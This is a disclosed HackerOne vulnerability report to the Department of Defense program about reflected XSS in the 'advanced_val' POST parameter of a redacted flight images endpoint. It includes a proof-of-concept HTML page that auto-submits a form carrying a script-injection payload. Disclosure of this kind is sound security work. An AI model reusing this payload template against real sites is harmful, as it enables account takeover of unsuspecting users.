# [████████] — XSS on `/███████_flight/images` via `advanced_val` parameter

## Report Details
- **Report ID**: 689257
- **URL**: https://hackerone.com/reports/689257
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-06T01:06:48.517Z
- **Disclosed**: 2020-05-14T18:01:54.746Z

## Reporter
- **Username**: usamasood
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Description

POST parameter `advanced_val` is vulnerable to reflected XSS on endpoint `https://███/██████████_flight/images`. XSS affects all users and no authentication or login is required.

## Proof of Concept

Either visit the following URL for PoC:

https://██████████/poc/

Or, create your own PoC file:

```html
<html>
<head>
    <title>XSS POC</title>
</head>
<body onload=document.getElementById("xss").submit()>
<form id='xss' method="post" enctype="application/x-www-form-urlencoded" action="https://█████/█████████_flight/images">
    <input type='hidden' name='advanced_val' value='xss"><script>alert(document.domain)</script>'>
</form>
</body>
</html>
```
██████████

## Impact

An attacker can take over an account of an authenticated user by stealing any anti-CSRF tokens and using that token to takeover an account.

## Attachments
No attachments
